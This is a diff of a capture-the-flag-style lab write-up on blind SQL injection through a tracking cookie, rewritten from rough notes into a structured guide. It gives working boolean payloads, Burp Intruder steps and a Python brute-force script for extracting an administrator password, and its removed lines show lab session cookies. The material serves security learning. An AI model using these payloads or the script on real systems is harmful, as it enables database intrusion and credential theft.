@@ -1,87 +1,151 @@
-in this lab we had to perform a blind sql inject.
+# Lab: Blind SQL Injection with Conditional Responses
 
-first i tried what i did in all the precious labs, tried url injection but it did not break the page but did not give data or error.
+**Platform:** PortSwigger Web Security Academy  
+**Difficulty:** Practitioner  
+**Topic:** Blind SQL Injection — Password Extraction  
+**Status:** ✅ Solved
 
-so had to go to burpsuite and fetch the cookie session id and tracking id.
+---
 
-from which tried to add the 'AND 1=1-- to check if injection is possible. it did display welcome back message and it proved injection is poassible
+## Objective
+Extract the administrator's password from a database using blind
+SQL injection — where no data or errors are ever shown on the page.
+The only feedback is whether "Welcome back" appears or disappears.
 
-however, there is one thing i noticed in session id we cannot use + after the comment -- becz it means someting else(am i right or wrong? claude) 
+---
 
-then tried the 1=2 querry that did not return the welcome back message so we can confirm that the boolean values are working(true/false) with the response of 'welcome back!' message
+## What Makes This "Blind" SQLi
 
-now next step, to confirm the 'users' table acutally exists i tried this querry: 'AND (SELECT'X' FROM users LIMIT 1) = 'X'-- (this appends after the tracking id)
+Unlike normal SQLi where results are displayed on the page:
+- Query results are **never shown**
+- No error messages are displayed
+- The only feedback is the **"Welcome back"** message
+- TRUE condition → Welcome back appears
+- FALSE condition → Welcome back disappears
 
-SELECT 'x' FROM users — doesn't fetch real data, just returns the letter 'x' for every row in the users table
-LIMIT 1 — only return one row, not all rows. Without this, if users table has multiple rows it could cause errors
-='x' — checks if the returned value equals 'x'
-If users table exists → query returns 'x' → matches 'x' → TRUE → Welcome back
-If users table doesn't exist → query fails → FALSE → no Welcome back
+This single yes/no response is the entire feedback mechanism.
 
-So it's basically just a clever way to check "does this table exist?" without needing to see any real data.
+---
 
-now we confirm that administrator exists in the users table so: ' AND (SELECT 'x' FROM users WHERE username='administrator')='x'--
+## Step 1 — Confirming SQL Injection is Possible
 
-now to check for the length of the password we can run this querry: 'AND (SELECT LENGTH(password) FROM users WHERE username = 'administrator') = 1(here keep trying =2,=3....=n)--
-                                              
-this gives us the correct 'welcome back' message on 20 length querry, so we can confirm that the length of the password of the admin is 20.(this can be used for manual bruteforce or setting for loop limit in python script)
+URL injection didn't work here — had to use **Burp Suite** to
+intercept and modify the **TrackingId cookie** directly.
 
-now there are two ways to find password in this: 1) manual 2) automatic using intruder in brup suit
+```sql
+TrackingId=xyz' AND 1=1--    ✅ Welcome back appeared (TRUE)
+TrackingId=xyz' AND 1=2--    ✅ Welcome back disappeared (FALSE)
+```
 
-for manual the querry we can use is:
+Boolean conditions confirmed working — SQLi is possible.
 
-    'AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username = administrator) = 'a'--
+**Important note on `+` in cookies:**
+- In URLs, `+` means a space
+- In cookies, `+` is a literal plus character
+- Never use `+` after `--` in cookie injection — it can break
+  the query. Always use just `--` as the comment terminator
 
-What SUBSTRING does:
+---
 
-SUBSTRING(password, 1, 1) — from the password, starting at position 1, take 1 character
-So this asks "is the first character of the password equal to 'a'?"
-Welcome back = yes, first char is 'a'
-No welcome back = no, try next letter(b,c,......z and 0,1....9)
+## Step 2 — Confirming Users Table Exists
 
-this takes too much time becz for each 20 letters length we have to run it a-z,0-9 times it is too tidious.
+```sql
+' AND (SELECT 'x' FROM users LIMIT 1)='x'--
+```
 
-2nd method we can use here is the automatic intruder which can fetch it automatically
+**What this query does:**
+- `SELECT 'x' FROM users` — doesn't fetch real data, just returns
+  the letter 'x' for every row in the users table
+- `LIMIT 1` — returns only one row to avoid errors if multiple
+  rows exist
+- `='x'` — checks if the returned value equals 'x'
+- Users table exists → returns 'x' → matches 'x' → TRUE → Welcome back
+- Users table doesn't exist → query fails → FALSE → no Welcome back
 
-to do it using intruder first right click on the packet info in the repeater and select send to intruder.
+✅ Welcome back appeared — users table confirmed.
 
-then fist it will automatically set the position which are auto-detected. first clear it by pressing the clear button at top.
+**Mistake made:** Case sensitivity — `'x'` and `'X'` are not equal
+in SQL string comparisons. Both sides of `=` must match exactly.
 
-then select the 'AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username = administrator) = 'a'-- querry's 'a'  and press 'Add §' button which is next to clear button. this set the intruder to auto 
-change the value of that specific selected character and make sure the 'a' changes to '§a§' this means it is still 'a' but it is selected to change automatically according to querry payload.
+---
 
-now, what values to check for instead of 'a' if it does not work, we have to add all of these values one by one
-so in the Payload section left of the packet info in the intruder --> payload configuration --> ADD a in text field then enter. again add b in text field and enter till ....z and 0,,,,9
+## Step 3 — Confirming Administrator User Exists
 
-now next, in the most right of the burpsuit intruder setting there is setting for intruder written in vertical format. select that and in that there is a section called 'grep-match' this section will grep
-anything pertcular thing added to match in the responce and in the attack page when the attack is being performed there is a new column which will say 1 if matched so we dont have to manually check each responce for the welcome back message is send back or not.
-also without the grep added we can actually see the length cols value change for that perticular response to determine this is the correct output.
+```sql
+' AND (SELECT 'x' FROM users WHERE username='administrator')='x'--
+```
 
-in grep match section --> ADD 'Welcome back'
+✅ Welcome back appeared — administrator user confirmed to exist.
 
-so when ever the welcome back matches it will indicate us
+---
 
-now if we click on attack and perform the attack it did give us the first character which is 'x'. 
+## Step 4 — Finding Password Length
 
-now we change the queey in the intruder to: 
+```sql
+' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=1--
+```
 
-      'AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username = administrator) = 'a'--
-so we move to position 2 now. 
-this was we have to perform this bruteforce attack 20 times total(length of password) to get the password but changing position each time one attack is finished and incrementing the position manually.
+Keep incrementing the number until Welcome back appears:
+```sql
+=1  ❌
+=2  ❌
+...
+=20 ✅ Welcome back — password is 20 characters long
+```
 
-HOWEVER, there is another way to do it even easily, one is brupsuit pro which is paid version or we can write a python script to perform all changes automatically for us.
+This is useful for:
+- Knowing when to stop manual brute force
+- Setting the loop limit in a Python script
 
-python has an inbuilt library called 'requests' which can be used as a browser to send and recive the data. 
+---
 
-so first to create a python script : nano ~/sqli_brute.py
+## Step 5 — Extracting the Password
 
-write this python script into this file
+Two methods available:
 
+### Method 1 — Manual (slow)
+
+```sql
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
+```
+
+**What SUBSTRING does:**
+- `SUBSTRING(password, 1, 1)` — starting at position 1, take 1 character
+- Try every character (a-z, 0-9) until Welcome back appears
+- Repeat for all 20 positions manually
+- Very tedious — 20 positions × 36 characters = up to 720 requests
+
+### Method 2 — Burp Suite Intruder (semi-automatic)
+
+1. Right click request in Repeater → **Send to Intruder**
+2. In **Positions** tab → click **Clear §** to remove auto-detected positions
+3. In the TrackingId value, highlight just the character to test
+   and click **Add §**:
+   ')='§a§'--
+4. In **Payloads** tab → add all characters one by one (a-z, 0-9)
+5. In **Settings** tab → **Grep - Match** section → Add `Welcome back`
+6. Click **Start Attack**
+7. The character with a ✓ in the Welcome back column is correct
+8. Change position number and repeat 20 times total
+
+**Mistake made:** Added "Welcome back" to Proxy match/replace rules
+instead of Intruder Grep-Match settings — completely different
+sections. Grep-Match is in Intruder's Settings panel on the right.
+
+**Limitation:** Community edition throttles Intruder — slow for
+large attacks. Pro version handles this much faster.
+
+### Method 3 — Python Script (fastest)
+
+Since Community edition Intruder is slow, wrote a Python script
+to automate all 20 positions automatically:
+
+```python
 import requests
 
-url = "https://0a5400f904df09b382f4c6840072002b.web-security-academy.net/filter?category=Food"
-session = "d8mzyip6wrq1dqnkdgjhkmngjrvfxqur"
-tracking_id = "ty9ZTn8iZb6LjizD"
+url = "https://YOUR-LAB.web-security-academy.net/filter?category=Food"
+session = "YOUR_SESSION_COOKIE"
+tracking_id = "YOUR_TRACKING_ID"
 password = ""
 
 for position in range(1, 21):
@@ -97,13 +161,82 @@ for position in range(1, 21):
             break
 
 print(f"\nFull Password: {password}")
+```
 
-then--> ctrl-X-->Y-->ENTER
-to save the file
+**To run:**
+```bash
+nano ~/sqli_brute.py    # create and paste script
+python3 ~/sqli_brute.py # run the script
+```
 
-to create this file we need 2 things from the burpsuit which are 1) native url of the lab(original one with no injection performed on it, it can be found just above packet info in the intruder section)
-2) the session id and tracking id
+**What you need from Burp Suite:**
+- Lab URL (shown above the request in Intruder)
+- Session cookie value
+- Original TrackingId value (without any injection)
 
-now we just directly run the file by: python3 ~/sqli_brute.py
+**How the script works:**
+- Outer loop: goes through positions 1-20
+- Inner loop: tries every character a-z then 0-9
+- Sends each request with the injected cookie
+- Checks if "Welcome back" is in the response
+- If match found → saves character → breaks inner loop → next position
+- Prints each character as found, full password at the end
 
-this automatically runs all possible combinations given and keeps displaying each matched value from each attack and in the end after the for loop ends it prints entire password in one line.
+**Result:** Password found: `xwgum8s6i38b7tyahe4h`
+
+---
+
+## Key Concepts Learned
+
+**What is Blind SQLi?**
+- SQL injection where no output is returned to the page
+- Relies entirely on observable differences in application behavior
+- Boolean-based: true/false conditions change page response
+- Much harder to exploit than regular SQLi — requires many requests
+
+**Blind SQLi vs Regular SQLi:**
+| Type | Data Shown | Error Shown | Method |
+|---|---|---|---|
+| Regular SQLi | ✅ Yes | ✅ Yes | Direct UNION extraction |
+| Blind SQLi | ❌ No | ❌ No | True/False conditions |
+
+**Key SQL Functions Used:**
+| Function | Purpose | Example |
+|---|---|---|
+| `LENGTH()` | Get string length | `LENGTH(password)` |
+| `SUBSTRING()` | Extract single character | `SUBSTRING(password,1,1)` |
+| `LIMIT 1` | Return only one row | `SELECT 'x' FROM users LIMIT 1` |
+
+**Burp Suite Tools Used:**
+| Tool | Purpose |
+|---|---|
+| Proxy | Intercept and capture requests |
+| Repeater | Manually modify and resend requests |
+| Intruder | Automate payload testing |
+| Grep-Match | Highlight matching responses automatically |
+
+---
+
+## Mistakes Made
+
+- Tried URL injection first — blind SQLi uses cookies not URL
+- Used `+` after `--` in cookie — breaks query, use just `--`
+- Case sensitivity issue with `'x'` vs `'X'` — SQL strings are
+  case sensitive, both sides of `=` must match exactly
+- Added Grep-Match to wrong section (Proxy instead of Intruder)
+- Added all characters as one entry instead of individually in
+  Intruder payload list — must be one character per line
+- Used LENGTH query in Intruder instead of SUBSTRING query
+
+---
+
+## Payloads Summary
+
+```sql
+' AND 1=1--                                              -- confirm SQLi
+' AND 1=2--                                              -- boolean false test
+' AND (SELECT 'x' FROM users LIMIT 1)='x'--             -- confirm table exists
+' AND (SELECT 'x' FROM users WHERE username='administrator')='x'-- -- confirm user
+' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=20-- -- password length
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='x'-- -- extract char
+```
